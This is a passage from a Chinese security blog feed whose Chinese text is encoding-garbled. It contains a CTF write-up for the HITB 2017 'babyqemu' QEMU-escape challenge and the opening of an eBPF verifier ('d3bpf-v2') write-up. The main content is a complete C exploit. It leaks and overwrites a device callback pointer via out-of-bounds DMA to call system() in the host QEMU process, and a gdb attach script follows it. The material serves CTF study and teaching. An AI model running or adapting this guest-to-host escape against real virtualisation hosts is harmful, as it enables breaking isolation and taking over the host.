é€’å†…å®¹åœ¨ç‰©ç†åœ°å€å’Œè™šæ‹Ÿåœ°å€ä¹‹é—´ã€‚<code>cpu_physical_memory_rw</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ—¶ç‰©ç†åœ°å€ï¼Œè™šæ‹Ÿåœ°å€éœ€è¦é€šè¿‡è¯»å–/proc/$pid/pagemapè½¬æ¢ä¸ºç‰©ç†åœ°å€ã€‚</p><ol><li> dma.cmd==7æ—¶ï¼Œidx=dma.src-0x40000ï¼Œaddr = dma_buf[idx]ï¼Œè°ƒç”¨encåŠ å¯†å‡½æ•°åŠ å¯†ï¼Œå¹¶å†™å…¥åˆ°dma.dstä¸­</li><li> dma.cmd==3æ—¶ï¼Œidx=dma.src-0x40000ï¼Œaddr = dma_buf[idx]ï¼Œå†™å…¥åˆ°dma.dstä¸­</li><li> dma.cmd==1æ—¶ï¼Œidx=dma.dst-0x40000,addr=dma_buf[idx]ï¼Œå°†å…¶å†™å…¥åˆ°dma.srcä¸­ï¼ˆç¬¬äºŒä¸ªå‚æ•°å¯ä»¥é€šè¿‡è°ƒè¯•å¾—åˆ°å…¶åœ°å€å°±æ˜¯dma_buf[dma.dst-0x40000]</li></ol><p>è¿™ä¸ªç¨‹åºçš„ä½œç”¨å°±æ˜¾è€Œæ˜“è§ï¼Œè¿™é‡Œå®ç°çš„æ˜¯ä¸€ä¸ªdmaæœºåˆ¶ã€‚DMA(Direct Memory Accessï¼Œç›´æ¥å†…å­˜å­˜å–) æ˜¯æ‰€æœ‰ç°ä»£ç”µè„‘çš„é‡è¦ç‰¹è‰²ï¼Œå®ƒå…è®¸ä¸åŒé€Ÿåº¦çš„ç¡¬ä»¶è£…ç½®æ¥æ²Ÿé€šï¼Œè€Œä¸éœ€è¦ä¾èµ–äº CPU çš„å¤§é‡ä¸­æ–­è´Ÿè½½ã€‚DMA ä¼ è¾“å°†æ•°æ®ä»ä¸€ä¸ªåœ°å€ç©ºé—´å¤åˆ¶åˆ°å¦å¤–ä¸€ä¸ªåœ°å€ç©ºé—´ã€‚å½“CPU åˆå§‹åŒ–è¿™ä¸ªä¼ è¾“åŠ¨ä½œï¼Œä¼ è¾“åŠ¨ä½œæœ¬èº«æ˜¯ç”± DMA æ§åˆ¶å™¨æ¥å®è¡Œå’Œå®Œæˆã€‚</p><p>å³é¦–å…ˆé€šè¿‡è®¿é—®mmioåœ°å€ä¸å€¼ï¼ˆaddrä¸valueï¼‰ï¼Œåœ¨<code>hitb_mmio_write</code>å‡½æ•°ä¸­è®¾ç½®å¥½dmaä¸­çš„ç›¸å…³å€¼ï¼ˆsrcã€dstä»¥åŠcmd)ã€‚å½“éœ€è¦dmaä¼ è¾“æ•°æ®æ—¶ï¼Œè®¾ç½®addrä¸º152ï¼Œå°±ä¼šè§¦å‘æ—¶é’Ÿä¸­æ–­ï¼Œç”±å¦ä¸€ä¸ªçº¿ç¨‹å»å¤„ç†æ—¶é’Ÿä¸­æ–­ã€‚æ—¶é’Ÿä¸­æ–­è°ƒç”¨<code>hitb_dma_timer</code>ï¼Œè¯¥å‡½æ•°æ ¹æ®<code>dma.cmd</code>çš„ä¸åŒè°ƒç”¨<code>cpu_physical_memory_rw</code>å‡½æ•°å°†æ•°æ®ä»ç‰©ç†åœ°å€æ‹·è´åˆ°<code>dma_buf</code>ä¸­æˆ–ä»<code>dma_buf</code>æ‹·è´åˆ°ç‰©ç†åœ°å€ä¸­ã€‚</p><h3 id="æ¼æ´åˆ†æä¸åˆ©ç”¨"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a>æ¼æ´åˆ†æä¸åˆ©ç”¨</h3><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ†æç¨‹åºçš„æ¼æ´äº†ï¼Œè¿™é‡Œçš„æ¼æ´æ˜¯éå¸¸æ˜æ˜¾çš„ä½äº<code>hitb_dma_timer</code>å‡½æ•°ä¸­ï¼Œå…¶ä¸­çš„v2æ˜¯æ²¡æœ‰åšä»»ä½•è¾¹ç•Œæ£€æŸ¥çš„ï¼Œå­˜åœ¨æ˜æ˜¾çš„æº¢å‡ºæ¼æ´ã€‚</p><p>å¹¶ä¸”åœ¨ä¸Šè¿°æ‰¾åˆ°çš„ç»“æ„ä½“çœ‹åˆ°äº†ï¼Œä»–çš„<code>dma_buf</code>çš„å¤§å°åªæœ‰4096ï¼Œå¹¶ä¸”ä¸‹æ–¹ç´§æ¥ç€å°±æ˜¯encã€‚è€Œæˆ‘ä»¬éƒ½çŸ¥é“encå­˜æ”¾çš„æ˜¯å›è°ƒå‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ©ç”¨æ€è·¯å°±æ˜¯ï¼Œé€šè¿‡æº¢å‡ºæ³„æ¼å‡ºencä¸­å­˜æ”¾çš„å‡½æ•°åœ°å€ï¼Œç´§æ¥ç€ä¿®æ”¹å…¶ä¸­çš„å‡½æ•°ä¸º<code>system@plt</code>ï¼Œæœ€ååœ¨<code>dma_buf</code>ä¸­å†™å…¥<code>cat flag\x00</code>å³å¯è·å–flagã€‚</p><p><strong>exp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DMABASE 0x40000</span></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_src</span><span class="params">(<span class="keyword">uint32_t</span> src_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>, src_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_dst</span><span class="params">(<span class="keyword">uint32_t</span> dst_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>, dst_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_cmd</span><span class="params">(<span class="keyword">uint32_t</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x98</span>, cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, buf, len);</span><br><span class="line"></span><br><span class="line">    dma_set_src(phy_userbuf);</span><br><span class="line">    dma_set_dst(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line">    dma_do_cmd(<span class="number">0</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_read</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dma_set_dst(phy_userbuf);</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">2</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_enc</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">1</span> | <span class="number">4</span> | <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate DMA buffer and obtain its physical address</span></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to leak enc ptr</span></span><br><span class="line">    dma_do_read(<span class="number">0x1000</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> leak_enc = *(<span class="keyword">uint64_t</span> *)userbuf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leaking enc function: %p\n&quot;</span>, (<span class="keyword">void</span> *)leak_enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pro_base = leak_enc - <span class="number">0x283DD0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = pro_base + <span class="number">0x1FDB18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to overwrite enc ptr to system ptr</span></span><br><span class="line">    dma_do_write(<span class="number">0x1000</span> + DMABASE, &amp;system_plt, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deply the parameter of system function</span></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;cat flag\x00&quot;</span>;</span><br><span class="line">    dma_do_write(<span class="number">0x200</span> + DMABASE, command, <span class="built_in">strlen</span>(command));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger the enc ptr to execute system</span></span><br><span class="line">    dma_do_enc(<span class="number">0x200</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230205170230132.png"                      alt="image-20230205170230132"                ></p><p>è°ƒè¯•è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">pid=`ps -aux | grep <span class="string">&quot;qemu-system-x86_64&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span> | awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">sudo gdb \</span><br><span class="line">-ex <span class="string">&quot;file qemu-system-x86_64&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;attach <span class="variable">$pid</span>&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;b*\$rebase(0x284191)&quot;</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230205173312988.png"                      alt="image-20230205173312988"                ></p><hr><p>é¢˜ç›®åœ°å€ï¼š<a class="link"   href="https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz" >https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz<i class="fas fa-external-link-alt"></i></a></p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a class="link"   href="https://www.anquanke.com/post/id/224199#h3-5" >https://www.anquanke.com/post/id/224199#h3-5<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup" >https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio" >https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é¦–å…ˆæ€»æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œqemuæ˜¯ä¸€ä¸ªå¼€æºçš„æ¨¡æ‹Ÿå™¨å’Œè™šæ‹Ÿæœºï¼Œé€šè¿‡åŠ¨æ€çš„äºŒè¿›åˆ¶è½¬æ¢æ¥æ¨¡æ‹Ÿ CPUçš„å·¥å…·ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å®é™…çš„ç¯å¢ƒä¸­ï¼Œqemuæœ‰å¤šç§è¿è¡Œæ¨¡å¼ï¼Œåœ¨ä»¥å¾€å¯ä»¥ä½¿ç”¨User modeè°ƒè¯•armã€mipsæ¶æ„çš„äºŒè¿›åˆ¶ç¨‹åºã€‚ä¹Ÿåœ¨kernel pwnä¸­ç”¨System modeè°ƒ</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/tags/qemu-escape/"/>
    
  </entry>
  
  <entry>
    <title>d3bpf-v2</title>
    <link href="https://cv196082.gitee.io/2023/01/11/d3bpf-v2/"/>
    <id>https://cv196082.gitee.io/2023/01/11/d3bpf-v2/</id>
    <published>2023-01-11T10:09:05.000Z</published>
    <updated>2023-01-11T10:11:17.190Z</updated>
    
    <content type="html"><![CDATA[<p>å› ä¸ºè¿‘æœŸä¸€ç›´åœ¨ç©å†…æ ¸ï¼Œåœ¨æŠŠè¿™ç¯‡æ–‡ç« å†™å®Œä¹‹åå°±ä¸ä¼šä¸€ç›´æ›´æ–°å†…æ ¸ç›¸å…³çš„äº†ï¼Œåç»­çš„æ‰“ç®—æ˜¯å­¦ä¹ å®Œé€ƒé€¸çš„å†…å®¹ä¹‹åå°±å¼€å§‹è¿›è¡Œåˆ·é¢˜å’Œå¤ç°æ¯”èµ›çš„ç»ƒä¹ äº†ã€‚</p><h2 id="åˆ†æé¢˜ç›®"><a href="#åˆ†æé¢˜ç›®" class="headerlink" title="åˆ†æé¢˜ç›®"></a>åˆ†æé¢˜ç›®</h2><p>é¦–å…ˆï¼Œè¿™é“é¢˜çš„å¤§è‡´è·Ÿä¸Šä¸€é“é¢˜ç›®ä¸€æ ·ï¼Œå­˜åœ¨ä¸€ä¸ªpatch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">40</span>d92628e..be9cdde7a <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-8100</span>,<span class="number">11</span> +<span class="number">8100</span>,<span class="number">11</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_scalar_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function"> scalar_min_max_lsh(dst_reg, &amp;src_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">case</span> BPF_RSH:</span></span></span><br><span class="line"><span class="params"><span class="function">-<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">-<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">- * This includes shifts by a negative number.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">- */</span></span></span></span><br><span class="line"><span class="params"><span class="function">-mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function">+__mark_reg32_known(dst_reg, <span class="number">0</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">else</span></span></span></span><br><span class="line"><span class="params"><span class="function">+__mark_reg_known_zero(dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„patchè·Ÿå‰é¢ä¸€é“é¢˜ä¸€æ ·ï¼Œåœ¨RSHä¸­è®¾ç½®äº†è¶…è¿‡æŒ‡å®šå¤§å°çš„æ•°æ—¶ä¼šè®¾ç½®ä¸ºknownçš„0ã€‚</p><p>ä¸åŒçš„æ˜¯è¿™é‡Œé¢˜ç›®ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬æ˜¯5.16.12+ï¼Œè€Œåœ¨æ–°ç‰ˆæœ¬çš„å†…æ ¸ä¸­å­˜åœ¨æ–°çš„æ£€æµ‹æœºåˆ¶ï¼š</p><ul><li>  ä»»ä½•æŒ‡é’ˆåªèƒ½è¿›è¡ŒåŠ å‡æ“ä½œï¼Œä¸èƒ½è¿›è¡Œæ¯”è¾ƒï¼ˆé˜²æ­¢ä¾§ä¿¡é“ï¼‰</li><li>  åœ¨è¿›è¡ŒæŒ‡é’ˆä¸å¯„å­˜å™¨æ“ä½œæ—¶ï¼Œverfierä¼šå°†å·²çŸ¥çš„å¯„å­˜å™¨æ›¿æ¢ä¸ºå¸¸æ•°è¿›è¡Œè®¡ç®—ã€‚</li></ul><p>æ‰€ä»¥è¿™ä¹Ÿå°±é€ æˆäº†å‰é¢çš„æ”»å‡»æ‰‹æ³•æ— æ•ˆäº†ã€‚</p><h2 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" 